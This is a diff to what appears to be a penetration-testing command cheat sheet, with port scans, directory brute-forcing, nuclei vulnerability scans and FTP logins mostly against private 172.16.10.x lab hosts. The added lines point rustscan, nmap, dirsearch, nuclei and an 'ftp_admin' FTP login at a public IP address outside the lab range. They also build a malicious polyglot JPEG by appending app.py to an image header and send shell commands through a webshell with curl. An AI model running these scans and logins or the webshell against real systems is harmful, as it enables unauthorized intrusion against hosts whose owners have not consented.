@@ -5,10 +5,12 @@ rustscan -g -a 172.16.10.0/24 -r 1-1024 | awk -F'->' '{print $1,$2}'
 rustscan -a 172.16.10.0/24 -r 1-65535 -b 1000 --ulimit 5000
 rustscan -a 172.16.10.0/24 -r 20-22 -b 1000 --ulimit 5000
 rustscan -a 172.16.10.10 -r 1-65535 -b 1000 --ulimit 5000 -g
+rustscan -a 46.219.66.140 -b 1000 --ulimit 5000 -g
 
 # Nmap
 
 nmap scanme.nmap.org --open
+nmap 46.219.66.140 --open
 nmap -sV --script=banner.nse 172.16.10.11
 nmap -sV --script=banner.nse 172.16.10.11 | grep "|_banner\||_http-server"
 nmap --script=ssh-auth-methods 172.16.10.13
@@ -38,6 +40,7 @@ dirsearch -u http://172.16.10.10:8081/
 dirsearch -u http://172.16.10.11
 dirsearch -u http://172.16.10.11/backup/acme-hyper-branding/
 dirsearch -u http://172.16.10.11/backup/acme-impact-alliance/
+dirsearch -u http://46.219.66.140
 
 # gitjacker
 
@@ -62,10 +65,20 @@ nuclei -u "172.16.10.11:21" -tags "ftp" -silent -nc | tr -d '[]'
 nuclei -u 172.16.10.10:8081 > "playground/nuclei-scan-results/172-16-10-10:8081.txt"
 nuclei -u 172.16.10.11:80 > "playground/nuclei-scan-results/172-16-10-11.txt"
 nuclei -u 172.16.10.12:80 > "playground/nuclei-scan-results/172-16-10-12.txt"
+nuclei -u 46.219.66.140
 
 ftp ftp://anonymous:@172.16.10.11
+ftp ftp://ftp_admin:@46.219.66.140
 bash ch05/nuclei-notifier.sh 172.16.10.10:8081 172.16.10.11:80 172.16.10.12:80
 echo -e acme-hyper-branding-{0..100}.{txt,csv,pdf,jpg}"\n" | sed 's/ //g' > "files_wordlist.txt"; head files_wordlist.txt
 wget <URL>
 
-bash -x playground/run_vulnerability_scanning.sh
+# Malicious Polyglot Files
+printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00\x43\x00...' > polyglot.jpg
+cat app.py >> polyglot.jpg
+
+# Webshell
+
+curl -s "http://172.16.10.10:8081/webshell/$(urlencode "ls")"
+curl -s "http://172.16.10.10:8081/webshell/$(urlencode "cd ..")"
+curl -s "http://172.16.10.10:8081/webshell/$(urlencode "cd ..; ls")"
